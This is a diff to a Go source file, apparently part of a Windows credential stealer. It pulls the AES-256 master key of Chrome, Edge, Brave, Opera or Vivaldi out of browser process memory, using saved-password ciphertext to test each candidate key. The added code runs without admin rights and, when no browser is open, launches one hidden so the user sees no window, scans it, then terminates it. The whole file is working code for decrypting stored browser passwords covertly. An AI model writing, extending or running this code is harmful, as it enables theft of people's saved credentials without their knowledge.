@@ -4,18 +4,27 @@ package main
 
 // memkey_windows.go – extract Chrome/Edge AES-256 key from process heap.
 //
-// Chrome and Edge run at Medium integrity (same as a standard user's processes).
-// A same-user process can open them with PROCESS_VM_READ without any elevation.
-// The 32-byte AES master key lives as a plain heap allocation; we scan private,
-// committed, writable pages and use a known v10/v20 ciphertext as a decryption
-// oracle: AES-GCM auth-tag failure is cryptographically guaranteed for the wrong
-// key, so false positives are impossible (2^-128 probability).
+// Strategy (no admin required):
+//   1. If the browser is already running, scan its heap directly.
+//      Chrome/Edge run at Medium integrity; PROCESS_VM_READ opens without elevation.
+//   2. If the browser is not running, spawn a hidden instance so it loads the
+//      profile (which causes it to decrypt the master key into memory), scan that
+//      process, then terminate it.  No window ever appears to the user.
+//
+// The 32-byte AES-256 master key lives as a plain heap allocation.  We slide a
+// 32-byte window across private committed writable pages and use a known v10/v20
+// ciphertext as a decryption oracle.  AES-GCM auth-tag failure is cryptographically
+// guaranteed for the wrong key (false-positive probability = 2^-128).
 
 import (
 	"crypto/aes"
 	"crypto/cipher"
 	"fmt"
+	"os"
+	"path/filepath"
 	"strings"
+	"syscall"
+	"time"
 	"unicode/utf16"
 	"unsafe"
 )
@@ -30,6 +39,7 @@ var (
 	procVirtualQueryEx           = kernel32dll.NewProc("VirtualQueryEx")
 	procReadProcessMemory        = kernel32dll.NewProc("ReadProcessMemory")
 	procCloseHandle              = kernel32dll.NewProc("CloseHandle")
+	procTerminateProcess         = kernel32dll.NewProc("TerminateProcess")
 )
 
 // ── Windows constants ────────────────────────────────────────────────────────
@@ -44,15 +54,16 @@ const (
 	pageWritecopy           = 0x08
 	pageExecuteReadwrite    = 0x40
 	pageExecuteWritecopy    = 0x80
-	invalidHandleValue      = ^uintptr(0) // (HANDLE)(-1)
+	invalidHandleValue      = ^uintptr(0)
 	maxScanRegion           = 256 * 1024 * 1024
+	createNoWindow          = 0x08000000
 )
 
 // ── Windows structs ──────────────────────────────────────────────────────────
 
 // processEntry32W mirrors PROCESSENTRY32W on amd64.
-// Go inserts 4 bytes of implicit padding before th32DefaultHeapID
-// to satisfy its 8-byte alignment requirement — matching MSVC's layout.
+// Go inserts 4 bytes of implicit padding before th32DefaultHeapID to satisfy
+// its 8-byte alignment requirement — matching MSVC's layout.
 type processEntry32W struct {
 	dwSize              uint32
 	cntUsage            uint32
@@ -91,8 +102,7 @@ func utf16PtrToStr(p []uint16) string {
 	return string(utf16.Decode(p[:n]))
 }
 
-// highEntropy rejects obvious non-key sequences (all-same-byte, all-zero).
-// A valid AES-256 random key has extremely low probability of failing this.
+// highEntropy rejects obvious non-key sequences (all-same-byte).
 func highEntropy(b []byte) bool {
 	if len(b) < 32 {
 		return false
@@ -107,7 +117,7 @@ func highEntropy(b []byte) bool {
 }
 
 // tryDecryptKey tests whether key correctly decrypts a v10/v20 AES-GCM blob.
-// A wrong key will fail the GCM auth-tag check with probability 1 - 2^-128.
+// A wrong key fails the GCM auth-tag check with probability 1 - 2^-128.
 func tryDecryptKey(key, ciphertext []byte) bool {
 	if len(key) != 32 || len(ciphertext) < 15 {
 		return false
@@ -120,9 +130,7 @@ func tryDecryptKey(key, ciphertext []byte) bool {
 	if err != nil {
 		return false
 	}
-	nonce := ciphertext[3:15]
-	payload := ciphertext[15:]
-	_, err = gcm.Open(nil, nonce, payload, nil)
+	_, err = gcm.Open(nil, ciphertext[3:15], ciphertext[15:], nil)
 	return err == nil
 }
 
@@ -156,8 +164,6 @@ func findBrowserPIDs(exeNames []string) []uint32 {
 
 // ── memory scanner ───────────────────────────────────────────────────────────
 
-// scanPIDForKey scans private, committed, writable heap pages in the given
-// process looking for a 32-byte window that correctly decrypts ciphertext.
 func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
 	handle, _, _ := procOpenProcess.Call(
 		processVMRead|processQueryInformation,
@@ -181,7 +187,6 @@ func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
 		regionSize := mbi.RegionSize
 		addr += regionSize
 
-		// Only examine private, committed, writable pages (heap).
 		if mbi.State != memCommit || mbi.Type != memPrivate {
 			continue
 		}
@@ -208,7 +213,6 @@ func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
 		}
 		buf = buf[:bytesRead]
 
-		// Slide a 32-byte window at 16-byte alignment (keys are typically aligned).
 		for i := 0; i+32 <= len(buf); i += 16 {
 			candidate := buf[i : i+32]
 			if !highEntropy(candidate) {
@@ -224,9 +228,108 @@ func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
 	return nil, fmt.Errorf("key not found in PID %d", pid)
 }
 
-// ── public entry point ───────────────────────────────────────────────────────
+// ── browser exe discovery ────────────────────────────────────────────────────
 
-// browserExeNames maps a Chromium browser display name to its process EXE.
+func findBrowserExe(browserName string) string {
+	lower := strings.ToLower(browserName)
+	lad := os.Getenv("LOCALAPPDATA")
+	pf := os.Getenv("PROGRAMFILES")
+	pf86 := os.Getenv("PROGRAMFILES(X86)")
+	if pf == "" {
+		pf = `C:\Program Files`
+	}
+	if pf86 == "" {
+		pf86 = `C:\Program Files (x86)`
+	}
+
+	var candidates []string
+	switch {
+	case strings.Contains(lower, "edge"):
+		candidates = []string{
+			filepath.Join(pf86, `Microsoft\Edge\Application\msedge.exe`),
+			filepath.Join(pf, `Microsoft\Edge\Application\msedge.exe`),
+		}
+		if lad != "" {
+			candidates = append(candidates, filepath.Join(lad, `Microsoft\Edge\Application\msedge.exe`))
+		}
+	case strings.Contains(lower, "brave"):
+		candidates = []string{
+			filepath.Join(pf, `BraveSoftware\Brave-Browser\Application\brave.exe`),
+			filepath.Join(pf86, `BraveSoftware\Brave-Browser\Application\brave.exe`),
+		}
+	case strings.Contains(lower, "vivaldi"):
+		candidates = []string{
+			filepath.Join(lad, `Vivaldi\Application\vivaldi.exe`),
+		}
+	case strings.Contains(lower, "opera"):
+		candidates = []string{
+			filepath.Join(lad, `Programs\Opera GX\opera.exe`),
+			filepath.Join(lad, `Programs\Opera\opera.exe`),
+		}
+	default: // Chrome / Chromium
+		candidates = []string{
+			filepath.Join(pf, `Google\Chrome\Application\chrome.exe`),
+			filepath.Join(pf86, `Google\Chrome\Application\chrome.exe`),
+		}
+		if lad != "" {
+			candidates = append(candidates, filepath.Join(lad, `Google\Chrome\Application\chrome.exe`))
+		}
+	}
+
+	for _, c := range candidates {
+		if _, err := os.Stat(c); err == nil {
+			return c
+		}
+	}
+	return ""
+}
+
+// ── hidden browser spawn ─────────────────────────────────────────────────────
+
+// spawnHiddenBrowser launches the browser with no visible window, waits for
+// it to load the profile (and decrypt its master key), scans the process heap
+// for the key, then terminates the process.
+func spawnHiddenBrowser(exePath string, ciphertext []byte) ([]byte, error) {
+	// Command line: quoted exe path + flags that suppress UI and background activity.
+	cmdLine := fmt.Sprintf(
+		`"%s" --no-startup-window --no-first-run --disable-extensions --disable-sync --disable-background-networking`,
+		exePath,
+	)
+	cmdLineW, err := syscall.UTF16PtrFromString(cmdLine)
+	if err != nil {
+		return nil, fmt.Errorf("UTF16 convert: %w", err)
+	}
+
+	si := new(syscall.StartupInfo)
+	si.Cb = uint32(unsafe.Sizeof(*si))
+	si.Flags = syscall.STARTF_USESHOWWINDOW
+	si.ShowWindow = 0 // SW_HIDE
+
+	pi := new(syscall.ProcessInformation)
+
+	if err := syscall.CreateProcess(
+		nil,       // lpApplicationName — nil so Windows parses cmdLine
+		cmdLineW,
+		nil, nil,  // no custom security attributes
+		false,     // don't inherit handles
+		createNoWindow,
+		nil, nil,  // inherit environment and working dir
+		si, pi,
+	); err != nil {
+		return nil, fmt.Errorf("CreateProcess(%s): %w", exePath, err)
+	}
+	defer syscall.CloseHandle(pi.Thread)
+	defer procTerminateProcess.Call(uintptr(pi.Process), 0)
+	defer syscall.CloseHandle(pi.Process)
+
+	// Give the browser enough time to load the profile and decrypt the master key.
+	time.Sleep(2500 * time.Millisecond)
+
+	return scanPIDForKey(pi.ProcessId, ciphertext)
+}
+
+// ── browser exe name map ─────────────────────────────────────────────────────
+
 func browserExeNames(browserName string) []string {
 	lower := strings.ToLower(browserName)
 	switch {
@@ -240,28 +343,37 @@ func browserExeNames(browserName string) []string {
 		return []string{"browser.exe"}
 	case strings.Contains(lower, "opera"):
 		return []string{"opera.exe"}
-	default: // Chrome, Chromium, etc.
+	default:
 		return []string{"chrome.exe"}
 	}
 }
 
-// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key from
-// the running browser's heap. Requires no admin rights — same-user Medium
-// integrity processes are openly readable via PROCESS_VM_READ.
-// ciphertext must be a v10/v20-prefixed encrypted password blob from Login Data.
+// ── public entry point ───────────────────────────────────────────────────────
+
+// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key.
+//
+//   - If the browser is running: scans its heap directly (instant, no disruption).
+//   - If not running: spawns a hidden instance, waits for profile load (~2.5 s),
+//     scans memory, then terminates the spawned process.
+//
+// No admin rights required in either case.
 func getKeyFromBrowserMemory(browserName string, ciphertext []byte) ([]byte, error) {
 	if len(ciphertext) < 15 {
 		return nil, fmt.Errorf("ciphertext too short for oracle")
 	}
+
+	// 1. Try running instances first — no disruption, no spawning.
 	exeNames := browserExeNames(browserName)
-	pids := findBrowserPIDs(exeNames)
-	if len(pids) == 0 {
-		return nil, fmt.Errorf("%s not running", browserName)
-	}
-	for _, pid := range pids {
+	for _, pid := range findBrowserPIDs(exeNames) {
 		if key, err := scanPIDForKey(pid, ciphertext); err == nil {
 			return key, nil
 		}
 	}
-	return nil, fmt.Errorf("key not found in %s process memory", browserName)
+
+	// 2. Browser not running — spawn it hidden, scan, kill.
+	exePath := findBrowserExe(browserName)
+	if exePath == "" {
+		return nil, fmt.Errorf("browser not running and executable not found: %s", browserName)
+	}
+	return spawnHiddenBrowser(exePath, ciphertext)
 }
